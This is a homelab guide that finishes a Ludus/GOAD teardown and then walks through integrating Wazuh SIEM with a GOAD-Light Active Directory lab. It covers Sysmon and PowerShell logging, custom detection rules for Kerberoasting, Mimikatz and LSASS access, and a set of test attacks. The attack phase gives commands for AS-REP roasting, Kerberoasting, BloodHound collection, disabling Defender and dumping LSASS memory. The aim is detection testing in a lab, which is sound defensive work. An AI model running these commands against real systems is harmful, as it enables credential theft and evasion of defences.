  ip link set $br down 2>/dev/null
  ip link delete $br 2>/dev/null
done

# Strip Ludus bridges from /etc/network/interfaces
cp /etc/network/interfaces /etc/network/interfaces.bak

python3 <<'PY'
import re
with open('/etc/network/interfaces') as f:
    content = f.read()
content = re.sub(
    r'(?m)^auto vmbr10\d+\n(?:^iface vmbr10\d+.*\n(?:^\s+.*\n)*)?',
    '', content)
content = re.sub(r'\n{3,}', '\n\n', content)
with open('/etc/network/interfaces', 'w') as f:
    f.write(content)
PY

systemctl restart networking 2>/dev/null || ifreload -a
```

> If you lose Proxmox connectivity: `cp /etc/network/interfaces.bak /etc/network/interfaces && systemctl restart networking`

### Step 7 — Remove WireGuard and dnsmasq config

```bash
ip link delete wg0 2>/dev/null
ip link delete ludus 2>/dev/null

rm -f /etc/wireguard/wg0.conf /etc/wireguard/ludus.conf
systemctl disable wg-quick@wg0 2>/dev/null
systemctl disable wg-quick@ludus 2>/dev/null

rm -f /etc/dnsmasq.d/dnsmasq-vmbr1000.conf
rm -f /etc/dnsmasq.d/01-ludus.conf
systemctl restart dnsmasq 2>/dev/null
```

### Step 8 — Delete Ludus install dir

```bash
du -sh /opt/ludus 2>/dev/null
rm -rf /opt/ludus
rm -rf /opt/ludus-src
```

### Step 9 — Remove systemd units

```bash
rm -f /etc/systemd/system/ludus.service
rm -f /etc/systemd/system/ludus-admin.service
systemctl daemon-reload
```

### Step 10 — Remove Ludus binaries

```bash
rm -f /usr/local/bin/ludus
rm -f /usr/local/bin/ludus-install-status
rm -f /usr/local/bin/ludus-server
```

### Step 11 — Clean GOAD

```bash
rm -rf /root/GOAD
rm -rf /root/.goad
rm -rf /root/.ansible
```

### Step 12 — Reclaim space

```bash
apt autoremove --purge -y
apt clean
journalctl --vacuum-size=200M
rm -rf /tmp/ludus* /tmp/goad* /tmp/.ansible* 2>/dev/null
fstrim -av                     # SSD trim — helps thin pool reclaim
```

### Step 13 — Verify

```bash
qm list                                           # only your VMs
pvesh get /pools                                  # no ADMIN/SHARED/GOAD pools
pveum group list                                  # no ludus_*
pveum user token list root@pam                    # no ludus-token
ls /opt/ludus 2>&1                                # not exist
which ludus                                       # not found
ip link show | grep -E 'vmbr10|wg0' && echo "STILL PRESENT" || echo "CLEAN"
df -h /
pvesm status
```

### Step 14 — Reboot (recommended)

```bash
reboot
```

After reboot, run `qm list` and `df -h /` again to confirm clean state.

### Step 15 — Mac side

1. WireGuard.app → select Ludus tunnel → click `−` → confirm
2. `rm ~/Downloads/ludus.conf 2>/dev/null`

### Selective removal options

**Remove only GOAD, keep Ludus**:
```bash
ludus user rm --userid GOADLightbbe829 --url https://127.0.0.1:8081
rm -rf /root/GOAD /root/.goad
```

**Reset just a range, keep config**:
```bash
ludus --user $GOAD_USER range rm
ludus --user $GOAD_USER range deploy
```

### Space reclaimed

Typical recovery on a populated host: **80–250 GB**, primarily from:
- Template VMs (~30–60 GB each thin-provisioned)
- Range VMs (~20–40 GB each)
- Ludus install + PocketBase (~1–3 GB)
- GOAD source + ansible cache (~500 MB)

---

# Wazuh XDR/SIEM Integration with GOAD-Light on Ludus

A complete guide from a deployed GOAD-Light range through full Wazuh integration, agent deployment, Sysmon + PowerShell logging, custom detection rules, and attack testing.

---

## Prerequisites

This guide assumes you already have:

- A Ludus server with GOAD-Light deployed and all 4 VMs (`router`, `DC01`, `DC02`, `SRV02`, `kali`) showing as `On` in `ludus range status`
- An admin user with the `GOAD_USER` environment variable exported (e.g., `export GOAD_USER=GOADLightbbe829`)
- WireGuard access to the range (so you can hit the Wazuh dashboard from your laptop)
- Templates built: `win2019-server-x64-template`, `kali-x64-desktop-template`, `debian-11-x64-server-template`

Verify with:

```bash
ludus --user $GOAD_USER range status
```

Expected output: 5 VMs (router + 3 Windows + Kali), all powered on.

---

## Architecture Overview

| Component | VM | IP | Role |
|-----------|----|----|------|
| Wazuh Server (manager + indexer + dashboard) | Kali | `10.3.10.99` | SIEM ingest + UI |
| Wazuh Agent | DC01 (`kingslanding`) | `10.3.10.10` | Primary DC, parent domain |
| Wazuh Agent | DC02 (`winterfell`) | `10.3.10.11` | Child domain DC |
| Wazuh Agent | SRV02 (`castelblack`) | `10.3.10.22` | Member server |
| Router (no agent) | `router-debian11-x64` | `10.3.10.254` | Range routing |

All VMs on **VLAN 10** in network `10.3.0.0/16`. Agents talk to the manager on **TCP 1514** (events) and **TCP 1515** (enrollment). Dashboard reachable on **TCP 443** at `https://10.3.10.99`.

---

## Phase 1 — Install Wazuh Roles and Update Range Config

### 1.1 Add the Ansible roles to your Ludus user

```bash
ludus ansible role add aleemladha.wazuh_server_install --user $GOAD_USER
ludus ansible role add aleemladha.ludus_wazuh_agent --user $GOAD_USER
```

Verify they were added:

```bash
ludus ansible role list --user $GOAD_USER
```

### 1.2 Snapshot the clean GOAD-Light state

Before any change, lock in the current working state so you can roll back:

```bash
ludus --user $GOAD_USER snapshot create goad-light-clean \
  --description "GOAD-Light deployed, pre-Wazuh"
```

### 1.3 Pull and edit the current range config

```bash
ludus --user $GOAD_USER range config get > goad-light.yml
cp goad-light.yml goad-light.yml.bak
```

Open `goad-light.yml` in your editor and modify it to look like this:

```yaml
ludus:
  - vm_name: "{{ range_id }}-GOAD-DC01"
    hostname: "{{ range_id }}-DC01"
    template: win2019-server-x64-template
    vlan: 10
    ip_last_octet: 10
    ram_gb: 4
    cpus: 2
    windows:
      sysprep: true
    roles:
      - aleemladha.ludus_wazuh_agent
    role_vars:
      ludus_wazuh_siem_server: "10.3.10.99"

  - vm_name: "{{ range_id }}-GOAD-DC02"
    hostname: "{{ range_id }}-DC02"
    template: win2019-server-x64-template
    vlan: 10
    ip_last_octet: 11
    ram_gb: 4
    cpus: 2
    windows:
      sysprep: true
    roles:
      - aleemladha.ludus_wazuh_agent
    role_vars:
      ludus_wazuh_siem_server: "10.3.10.99"

  - vm_name: "{{ range_id }}-GOAD-SRV02"
    hostname: "{{ range_id }}-SRV02"
    template: win2019-server-x64-template
    vlan: 10
    ip_last_octet: 22
    ram_gb: 4
    cpus: 2
    windows:
      sysprep: true
    roles:
      - aleemladha.ludus_wazuh_agent
    role_vars:
      ludus_wazuh_siem_server: "10.3.10.99"

  - vm_name: "{{ range_id }}-kali"
    hostname: "{{ range_id }}-kali"
    template: kali-x64-desktop-template
    vlan: 10
    ip_last_octet: 99
    ram_gb: 8
    cpus: 4
    linux: true
    testing:
      snapshot: false
      block_internet: false
    roles:
      - aleemladha.wazuh_server_install
    role_vars:
      wazuh_admin_password: Wazuh-123
```

**Key changes:**

- Added `roles:` and `role_vars:` blocks to all 3 Windows VMs (pointing them at Kali)
- Added the same on Kali but using `aleemladha.wazuh_server_install`
- Bumped Kali RAM from `4` to `8` GB — Wazuh's indexer will OOM on 4 GB

> **RAM math:** DC01 (4) + DC02 (4) + SRV02 (4) + Kali (8) + Router (~1) = **21 GB** committed. On a 32 GB host that leaves ~11 GB for Proxmox + ZFS cache. Tight but workable.

### 1.4 Power off Kali to allow the RAM resize

```bash
ludus --user $GOAD_USER power off --name ${GOAD_USER}-kali
```

Wait until `ludus --user $GOAD_USER range status` shows Kali as `Off`.

### 1.5 Apply the updated config

```bash
ludus --user $GOAD_USER range config set --file goad-light.yml
```

If YAML is invalid, the error message will point at the line — fix and retry.

### 1.6 Power Kali back on

```bash
ludus --user $GOAD_USER power on --name ${GOAD_USER}-kali
```

Wait ~2 minutes for Kali to fully boot.

### 1.7 Deploy the Wazuh roles

```bash
ludus --user $GOAD_USER range deploy --tags user-defined-roles
```

Monitor in another terminal:

```bash
ludus --user $GOAD_USER range logs -f
```

**Expected timing:**

- Wazuh server install on Kali: **30–45 minutes** (downloads OpenSearch, Wazuh manager, dashboard, filebeat)
- Each Windows agent install: **3–5 minutes**

A successful run ends with a `PLAY RECAP` showing `failed=0` for every host.

---

## Phase 2 — Verify Wazuh Is Running

### 2.1 Check the dashboard

From any machine with WireGuard access, open:

```
https://10.3.10.99/
```

Click through the self-signed cert warning. Login:

```
Username: admin
Password: Wazuh-123
```

### 2.2 Verify all 3 agents are Active

In the dashboard: **☰ menu → Endpoints summary → Agents**

You should see:

| ID | Name | IP | Status |
|----|------|----|----|
| 001 | kingslanding | 10.3.10.10 | active |
| 002 | winterfell | 10.3.10.11 | active |
| 003 | castelblack | 10.3.10.22 | active |

> Hostnames are `kingslanding` / `winterfell` / `castelblack` (set by GOAD's Ansible during domain provisioning), not the Ludus VM names.

### 2.3 If an agent shows Disconnected

SSH into Kali:

```bash
ludus --user $GOAD_USER shell ${GOAD_USER}-kali
sudo /var/ossec/bin/agent_control -l
```

Then RDP into the failing Windows VM and check the agent:

```powershell
Get-Service Wazuh
Test-NetConnection 10.3.10.99 -Port 1514
Get-Content "C:\Program Files (x86)\ossec-agent\ossec.log" -Tail 30
Restart-Service Wazuh
```

### 2.4 Snapshot this state

```bash
ludus --user $GOAD_USER snapshot create goad-wazuh-deployed \
  --description "Wazuh server + 3 agents active"
```

---

## Phase 3 — Install Sysmon and Enable PowerShell Logging

This is the highest-impact tuning step. Without Sysmon, Wazuh sees only basic Windows event logs and misses most of what attackers do (process command lines, network connections, file/registry changes, etc.).

### 3.1 The all-in-one PowerShell setup script

Save the following as `C:\setup-wazuh-detection.ps1` on each Windows VM (RDP in, paste into Notepad, save as `.ps1`):

```powershell
#Requires -RunAsAdministrator
<#
    Wazuh Detection Stack Setup - Phase 1 + 2
    Installs Sysmon with SwiftOnSecurity config and configures Wazuh agent
    to ingest Sysmon + PowerShell event channels.

    Safe to re-run - every step is idempotent.
#>

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-Step { param($msg) Write-Host "`n[+] $msg" -ForegroundColor Cyan }
function Write-Ok   { param($msg) Write-Host "    $msg" -ForegroundColor Green }
function Write-Warn { param($msg) Write-Host "    $msg" -ForegroundColor Yellow }
function Write-Err  { param($msg) Write-Host "    $msg" -ForegroundColor Red }

# ---------------------------------------------------------------------
# 1. Download Sysmon + SwiftOnSecurity config
# ---------------------------------------------------------------------
Write-Step "Downloading Sysmon and SwiftOnSecurity config"

$sysmonDir = "C:\Tools\Sysmon"
New-Item -ItemType Directory -Path $sysmonDir -Force | Out-Null
$sysmonExe  = "$sysmonDir\Sysmon64.exe"
$sysmonConf = "$sysmonDir\sysmonconfig.xml"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Invoke-WebRequest -Uri "https://live.sysinternals.com/Sysmon64.exe" -OutFile $sysmonExe
Write-Ok "Sysmon64.exe downloaded"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile $sysmonConf
Write-Ok "sysmonconfig.xml downloaded"

# ---------------------------------------------------------------------
# 2. Install or update Sysmon
# ---------------------------------------------------------------------
Write-Step "Installing or updating Sysmon"

$svc = Get-Service -Name "Sysmon64" -ErrorAction SilentlyContinue
if ($svc) {
    & $sysmonExe -accepteula -c $sysmonConf | Out-Null
    Write-Ok "Sysmon config updated"
} else {
    & $sysmonExe -accepteula -i $sysmonConf | Out-Null
    Write-Ok "Sysmon installed"
}

Start-Sleep -Seconds 2
$svc = Get-Service Sysmon64
if ($svc.Status -eq "Running") { Write-Ok "Sysmon64 running" } else { Write-Err "Sysmon64 NOT running" }

# ---------------------------------------------------------------------
# 3. Edit ossec.conf to ingest Sysmon + PowerShell channels
# ---------------------------------------------------------------------
Write-Step "Updating Wazuh agent ossec.conf"

$ossecConf = "C:\Program Files (x86)\ossec-agent\ossec.conf"
$backup = "$ossecConf.bak-$(Get-Date -Format 'yyyyMMddHHmmss')"
Copy-Item $ossecConf $backup
Write-Ok "Backup: $backup"

$content = Get-Content $ossecConf -Raw

$newBlocks = @"

  <localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>

  <localfile>
    <location>Microsoft-Windows-PowerShell/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>

"@

if ($content -notmatch "Microsoft-Windows-Sysmon/Operational") {
    $content = $content -replace "</ossec_config>", "$newBlocks</ossec_config>"
    Set-Content -Path $ossecConf -Value $content -Encoding UTF8
    Write-Ok "Added Sysmon + PowerShell localfile blocks"
} else {
    Write-Warn "Blocks already present - skipping"
}

# ---------------------------------------------------------------------
# 4. Enable PowerShell logging via registry (GPO fallback)
# ---------------------------------------------------------------------
Write-Step "Enabling PowerShell logging via registry"

$psLog = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
if (-not (Test-Path $psLog)) { New-Item -Path $psLog -Force | Out-Null }
Set-ItemProperty -Path $psLog -Name "EnableScriptBlockLogging" -Value 1 -Type DWord -Force
Set-ItemProperty -Path $psLog -Name "EnableScriptBlockInvocationLogging" -Value 1 -Type DWord -Force

$psMod = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
if (-not (Test-Path $psMod)) { New-Item -Path $psMod -Force | Out-Null }
Set-ItemProperty -Path $psMod -Name "EnableModuleLogging" -Value 1 -Type DWord -Force

$psModNames = "$psMod\ModuleNames"
if (-not (Test-Path $psModNames)) { New-Item -Path $psModNames -Force | Out-Null }
Set-ItemProperty -Path $psModNames -Name "*" -Value "*" -Type String -Force

Write-Ok "ScriptBlock + Module logging enabled"

# ---------------------------------------------------------------------
# 5. Restart Wazuh agent
# ---------------------------------------------------------------------
Write-Step "Restarting Wazuh agent"

Restart-Service Wazuh -Force
Start-Sleep -Seconds 5
$wsvc = Get-Service Wazuh
if ($wsvc.Status -eq "Running") { Write-Ok "Wazuh restarted" } else { Write-Err "Wazuh NOT running" }

# ---------------------------------------------------------------------
# 6. Sanity check
# ---------------------------------------------------------------------
$recent = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 3 -ErrorAction SilentlyContinue
if ($recent) { Write-Ok "Sysmon producing events ($($recent.Count) recent found)" }

Write-Host "`n========================================" -ForegroundColor Green
Write-Host "  Setup complete on $env:COMPUTERNAME" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
```

### 3.2 Run on each Windows VM

RDP into each (`10.3.10.10`, `.11`, `.22`), open **PowerShell as Administrator**, and run:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
C:\setup-wazuh-detection.ps1
```

### 3.3 Verify in Wazuh dashboard

Go to **Threat Hunting** → in the **DQL search bar at the top** (not the filter dialog), enter:

```
data.win.system.providerName: ("Microsoft-Windows-Sysmon" or "Microsoft-Windows-PowerShell")
```

Within ~1 minute you should see hundreds of events. The **Top 10 MITRE ATT&CKs** widget will start populating automatically.

> **Common pitfall:** if you used the "Add filter" button, you'll be in the OpenSearch DSL editor which expects JSON. Always use the top DQL search bar for human-readable queries.

---

## Phase 4 — Add Custom Detection Rules

The default Wazuh ruleset is broad but doesn't have GOAD-specific detections. We'll add targeted rules for the classic AD attacks GOAD lets you practice.

### 4.1 SSH into Kali and edit local rules

```bash
ludus --user $GOAD_USER shell ${GOAD_USER}-kali
sudo nano /var/ossec/etc/rules/local_rules.xml
```

Paste this (replace existing content or add inside the existing `<group>`):

```xml
<group name="goad,custom,">

  <!-- Kerberoasting: TGS request with weak RC4 encryption -->
  <rule id="100100" level="10">
    <if_sid>60103</if_sid>
    <field name="win.eventdata.ticketEncryptionType">0x17</field>
    <field name="win.eventdata.serviceName" negate="yes">krbtgt|.*\$</field>
    <description>Possible Kerberoasting: RC4 TGS request for $(win.eventdata.serviceName) by $(win.eventdata.targetUserName)</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
  </rule>

  <!-- AS-REP Roasting: pre-auth disabled -->
  <rule id="100101" level="12">
    <if_sid>60103</if_sid>
    <field name="win.eventdata.preAuthType">0</field>
    <description>Possible AS-REP Roasting: pre-auth disabled for $(win.eventdata.targetUserName)</description>
    <mitre>
      <id>T1558.004</id>
    </mitre>
  </rule>

  <!-- Encoded PowerShell -->
  <rule id="100104" level="10">
    <if_sid>91802,255000</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)-[eE][nNcC]</field>
    <description>Encoded PowerShell command: $(win.eventdata.commandLine)</description>
    <mitre>
      <id>T1059.001</id>
      <id>T1027</id>
    </mitre>
  </rule>

  <!-- BloodHound / SharpHound -->
  <rule id="100105" level="12">
    <if_sid>61603,255000</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)SharpHound|bloodhound|Invoke-BloodHound</field>
    <description>BloodHound collector: $(win.eventdata.commandLine)</description>
    <mitre>
      <id>T1087.002</id>
      <id>T1018</id>
    </mitre>
  </rule>

  <!-- Mimikatz patterns -->
  <rule id="100106" level="14">
    <if_sid>61603,91802,255000</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)sekurlsa|kerberos::list|lsadump|privilege::debug|invoke-mimikatz</field>
    <description>Mimikatz pattern: $(win.eventdata.commandLine)</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
  </rule>

  <!-- LSASS access (Sysmon EID 10) -->
  <rule id="100103" level="13">
    <if_sid>61609</if_sid>
    <field name="win.eventdata.targetImage" type="pcre2">lsass\.exe$</field>
    <field name="win.eventdata.grantedAccess" type="pcre2">0x1010|0x1410|0x1438|0x143a|0x1fffff</field>
    <description>Suspicious LSASS access from $(win.eventdata.sourceImage)</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
  </rule>

  <!-- Scheduled task creation -->
  <rule id="100107" level="10">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4698$</field>
    <description>Scheduled task created: $(win.eventdata.taskName) by $(win.eventdata.subjectUserName)</description>
    <mitre>
      <id>T1053.005</id>
    </mitre>
  </rule>

</group>
```

Save: `Ctrl+O`, `Enter`, `Ctrl+X`.

### 4.2 Validate the rules

```bash
sudo /var/ossec/bin/wazuh-logtest
```

Hit `Ctrl+C` to exit if it loads with no errors. If it complains about syntax, fix the XML and re-run.

### 4.3 Restart the manager

```bash
sudo systemctl restart wazuh-manager
sudo tail -30 /var/ossec/logs/ossec.log
```

Look for `Started wazuh-analysisd` near the bottom with no rule-parsing errors.

---

## Phase 5 — Test Detections with Real Attacks

Run these from Kali to fire each custom rule. After each, check the dashboard with the filter:

```
rule.id: (100100 OR 100101 OR 100103 OR 100104 OR 100105 OR 100106 OR 100107)
```

### 5.1 AS-REP Roasting (rule 100101, level 12)

GOAD-Light's `s.baratheon` has Kerberos pre-auth disabled — the attack always succeeds:

```bash
cat > /tmp/users.txt <<EOF
s.baratheon
b.stark
j.snow
arya.stark
brandon.stark
EOF

impacket-GetNPUsers sevenkingdoms.local/ -usersfile /tmp/users.txt -no-pass -dc-ip 10.3.10.10
```

You'll get `s.baratheon`'s AS-REP hash printed. Wazuh fires rule **100101**.

### 5.2 Kerberoasting (rule 100100, level 10)

```bash
impacket-GetUserSPNs sevenkingdoms.local/stephen.travolta:Password123! \
  -dc-ip 10.3.10.10 -request
```

### 5.3 BloodHound Collection (rule 100105, level 12)

```bash
bloodhound-python -u stephen.travolta -p 'Password123!' \
  -d sevenkingdoms.local -ns 10.3.10.10 -c All
```

### 5.4 Encoded PowerShell (rule 100104, level 10)

RDP into any Windows VM, open PowerShell:

```powershell
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Get-Process"))
powershell.exe -EncodedCommand $enc
```

### 5.5 Mimikatz pattern (rule 100106, level 14)

Even a benign command with a Mimikatz string triggers the regex:

```powershell
echo "sekurlsa::logonpasswords"
```

For an actual Mimikatz test, disable Defender first:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### 5.6 Scheduled task creation (rule 100107, level 10)

```powershell
schtasks /create /tn "test-detection" /tr "calc.exe" /sc once /st 23:59 /ru SYSTEM
```

### 5.7 LSASS access (rule 100103, level 13)

With Defender disabled, on a Windows VM:

```powershell
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
```

Re-enable Defender after:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

---

## Phase 6 — Agent Grouping (Optional)

Useful once you start writing rules that should only apply to DCs vs. member servers.

### 6.1 Create groups

```bash
ludus --user $GOAD_USER shell ${GOAD_USER}-kali
sudo /var/ossec/bin/agent_groups -a -g dc
sudo /var/ossec/bin/agent_groups -a -g member-server
```

### 6.2 Assign agents

```bash
# kingslanding (DC01) and winterfell (DC02) are DCs
sudo /var/ossec/bin/agent_groups -a -i 001 -g dc
sudo /var/ossec/bin/agent_groups -a -i 002 -g dc

# castelblack (SRV02) is a member server
sudo /var/ossec/bin/agent_groups -a -i 003 -g member-server
```

### 6.3 Verify

```bash
sudo /var/ossec/bin/agent_groups -l
```

Group-specific config files live at `/var/ossec/etc/shared/dc/` and `/var/ossec/etc/shared/member-server/`. You can drop a custom `agent.conf` in each to push group-targeted localfile entries, FIM paths, etc.

---

## Phase 7 — Snapshot the Tuned State

```bash
ludus --user $GOAD_USER snapshot create goad-wazuh-tuned \
  --description "GOAD-Light + Wazuh + Sysmon + PS logging + custom rules"
```

You can now break things freely and revert with:

```bash
ludus --user $GOAD_USER snapshot revert goad-wazuh-tuned
```

---

## Phase 8 — Persistence and Auto-Recovery After Reboots

**Short answer: yes, everything you installed survives reboots and auto-starts.** You don't need to re-run any scripts after powering the lab back on. This section explains what persists, what doesn't, and how to verify everything came back up cleanly.

### 8.1 What survives reboots automatically

| Component | How it persists | Startup behavior |
|-----------|----------------|------------------|
| Sysmon | Driver + binary installed in `C:\Windows\`, registered as service | Auto-start (Automatic), runs as LocalSystem before login |
| Sysmon config | XML config baked into the service registration | Reloaded on service start |
| Wazuh agent | Service installed in `C:\Program Files (x86)\ossec-agent\` | Auto-start, reads `ossec.conf` on boot |
| `ossec.conf` edits | Plain text file on disk | Persists until manually changed |
| PowerShell logging | Registry keys in `HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\` | Applied at every PS session start |
| Wazuh manager / indexer / dashboard | Systemd services on Kali | All set to Automatic, start on boot |
| Custom rules | `/var/ossec/etc/rules/local_rules.xml` on Kali | Loaded on `wazuh-manager` startup |
| Historical events | OpenSearch indices on Kali's disk | Persistent across reboots |
| Agent enrollments | `/var/ossec/etc/client.keys` on Kali + agents | Persistent, agents auto-reconnect |
| Snapshots | Proxmox-level disk snapshots | Persistent until manually deleted |

### 8.2 What you need to enable for full auto-recovery

By default, Ludus-deployed VMs do **not** have Proxmox's "start at boot" enabled. After a Proxmox reboot they stay powered off until you manually start them. Enable autostart so the lab fully recovers on its own:

```bash
# SSH to the Proxmox host as root, then:
for vmid in $(qm list | awk 'NR>1 {print $1}'); do
  qm set $vmid --onboot 1
done
```

For better resilience, also set a sensible startup order so dependencies come up first (router before VMs that need network, DCs before member servers, Kali last):

```bash
# Replace VM IDs with your actual ones from `qm list`
qm set 109 --onboot 1 --startup order=1            # router (Debian)
qm set 110 --onboot 1 --startup order=2,up=60      # DC01 - wait 60s before next VM
qm set 111 --onboot 1 --startup order=3,up=30      # DC02
qm set 112 --onboot 1 --startup order=4            # SRV02 (member server)
qm set 113 --onboot 1 --startup order=5            # Kali (Wazuh server)
```

Verify:

```bash
qm config <vmid> | grep -E 'onboot|startup'
```

### 8.3 Boot sequence after a clean Proxmox reboot

1. **Proxmox boots** → ~1 minute
2. **VMs auto-start in order** → 3–5 minutes total
3. **On each Windows VM (automatic):**
   - `Sysmon64` service starts → begins logging to `Microsoft-Windows-Sysmon/Operational`
   - `Wazuh` service starts → reads the Sysmon + PowerShell channels and ships to Kali
4. **On Kali (automatic):**
   - `wazuh-indexer` starts → ~30 seconds to load shards
   - `wazuh-manager` starts → accepts agent connections
   - `wazuh-dashboard` starts → web UI reachable
5. **Agents reconnect**, buffered events flush, dashboard fully working

**Total recovery time: ~5–10 minutes** from "press power button" to "everything green."

### 8.4 Failure scenarios and recovery

| Failure | Auto-recovers? | Manual steps | Data loss |
|---------|---------------|--------------|-----------|
| Single Windows VM down | Yes (on boot) | `ludus power on --name <vm>` | Minimal (events during boot only) |
| Kali down | Yes (on boot) | `ludus power on --name <kali>` | Minimal (agents buffer events) |
| Proxmox clean reboot | Yes, if `onboot=1` set | None if configured | Minimal |
| Proxmox power cut (unclean) | Partial | May need manual service restart | Possible (rare disk corruption) |
| Mini PC hardware failure | No | Full rebuild from configs | Total (unless off-box backup) |
| Network partition (WireGuard) | Yes when network returns | None | None (internal lab continues) |

### 8.5 Post-reboot verification

After bringing the lab back, run this checklist:

```bash
# 1. All VMs powered on?
ludus --user $GOAD_USER range status

# 2. Wazuh services up on Kali?
ludus --user $GOAD_USER shell ${GOAD_USER}-kali \
  "sudo systemctl is-active wazuh-manager wazuh-indexer wazuh-dashboard"
# Expected: active / active / active

# 3. Agents reconnected?
ludus --user $GOAD_USER shell ${GOAD_USER}-kali \
  "sudo /var/ossec/bin/agent_control -l"
# Expected: all 3 agents showing as Active
```

And from any Windows VM (via RDP):

```powershell
Get-Service Sysmon64, Wazuh | Select-Object Name, Status, StartType
# Expected: both Running, both Automatic
```

If any service isn't running:

```powershell
# Windows
Start-Service Sysmon64
Start-Service Wazuh
```

```bash
# Kali — start indexer first, wait, then the rest
sudo systemctl start wazuh-indexer
sleep 30
sudo systemctl start wazuh-manager wazuh-dashboard
```

### 8.6 The one edge case — unclean power loss

If Proxmox is power-cycled abruptly (power loss, hard reset), OpenSearch on Kali occasionally fails to recover its shards cleanly and the dashboard returns "OpenSearch not ready" indefinitely.

Fix:

```bash
ludus --user $GOAD_USER shell ${GOAD_USER}-kali
sudo systemctl restart wazuh-indexer
sleep 60   # let shards recover
sudo systemctl restart wazuh-manager wazuh-dashboard
```

Happens roughly once every 10–20 unclean reboots. Set Proxmox up on a UPS if you want to avoid it.

### 8.7 Off-box config backup (recommended)

Snapshots protect against software-level breakage but not hardware failure. Back up your configs off-box so you can rebuild from scratch on new hardware in ~2 hours:

```bash
# On the Ludus host
mkdir -p ~/lab-backups && cd ~/lab-backups

# Save the range config
cp /root/goad-light.yml ./

# Pull custom rules from Kali
ludus --user $GOAD_USER shell ${GOAD_USER}-kali \
  "sudo cat /var/ossec/etc/rules/local_rules.xml" > local_rules.xml

# Save the PowerShell setup script
cp /path/to/setup-wazuh-detection.ps1 ./

# Tar it up
tar czf lab-backup-$(date +%Y%m%d).tar.gz *.yml *.xml *.ps1
```

Then push the tar to a Git repo, cloud storage, or external drive — anywhere off the Geekom.

For VM-level backups, configure Proxmox's built-in backup scheduler: **Datacenter → Backup → Add** in the Proxmox web UI. Point it at an external USB drive or NFS share, schedule it weekly.

### 8.8 What you'd need to manually re-do (almost never)

The only situations where you'd need to re-run setup steps:

- You revert to a snapshot taken **before** Sysmon was installed
- You destroy and redeploy a Ludus VM from template
- You manually uninstalled Sysmon (`Sysmon64.exe -u`)
- The Wazuh agent service was uninstalled (not just stopped)

In normal operation — power off the mini PC for a vacation, come back, power it on — everything resumes exactly where it left off, with the same agents, the same rules, the same historical data, and the same dashboard.

---

## Troubleshooting

### Dashboard won't load

```bash
ludus --user $GOAD_USER shell ${GOAD_USER}-kali
sudo systemctl status wazuh-indexer wazuh-dashboard wazuh-manager
sudo journalctl -u wazuh-indexer -n 50
```

If `wazuh-indexer` keeps restarting → OOM. Increase Kali RAM to 10 GB or close the Kali desktop session.

### Login fails despite correct password

```bash
sudo /usr/share/wazuh-indexer/plugins/opensearch-security/tools/wazuh-passwords-tool.sh \
  -u admin -p 'Wazuh-123'
sudo systemctl restart wazuh-dashboard
```

Wait 2 minutes and retry login.

### Agent shows "Never connected"

On the Windows VM:

```powershell
Test-NetConnection 10.3.10.99 -Port 1514
Test-NetConnection 10.3.10.99 -Port 1515
Restart-Service Wazuh
Get-Content "C:\Program Files (x86)\ossec-agent\ossec.log" -Tail 30
```

Look for `Connected to the server` in the log.

### Custom rule not firing

Check the actual rule ID that did match the event:

1. Dashboard → **Events** tab
2. Filter for the event you triggered
3. Expand it → note `rule.id`
4. Update your `<if_sid>` chain in `local_rules.xml` to include that parent rule ID
5. Restart `wazuh-manager`

### Verify Sysmon ingestion

DQL filter in Threat Hunting:

```
data.win.system.providerName: "Microsoft-Windows-Sysmon"
```

If no results: re-check `ossec.conf` on the agent has the localfile block and the service was restarted.

---

## Useful Commands Cheatsheet

```bash
# Range management
ludus --user $GOAD_USER range status
ludus --user $GOAD_USER range list
ludus --user $GOAD_USER range logs -f

# Power
ludus --user $GOAD_USER power off --name <vm-name>
ludus --user $GOAD_USER power on --name <vm-name>

# Snapshots
ludus --user $GOAD_USER snapshot list
ludus --user $GOAD_USER snapshot create <name> --description "..."
ludus --user $GOAD_USER snapshot revert <name>

# Shell access
ludus --user $GOAD_USER shell <vm-name>

# Deploy roles only (no full rebuild)
ludus --user $GOAD_USER range deploy --tags user-defined-roles
ludus --user $GOAD_USER range deploy --tags user-defined-roles --limit <vm-name>

# On Kali (Wazuh server)
sudo systemctl status wazuh-manager wazuh-indexer wazuh-dashboard
sudo /var/ossec/bin/agent_control -l                # list all agents
sudo /var/ossec/bin/agent_groups -l                 # list groups
sudo /var/ossec/bin/wazuh-logtest                   # validate rules
sudo tail -f /var/ossec/logs/alerts/alerts.json     # live alerts
sudo tail -f /var/ossec/logs/archives/archives.json # all events (if archive logging on)

# On Windows agents
Get-Service Wazuh
Restart-Service Wazuh
Get-Content "C:\Program Files (x86)\ossec-agent\ossec.log" -Tail 30
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
```

---

## Useful DQL Queries

| Goal | Query |
|------|-------|
| All Sysmon events | `data.win.system.providerName: "Microsoft-Windows-Sysmon"` |
| All PowerShell events | `data.win.system.providerName: "Microsoft-Windows-PowerShell"` |
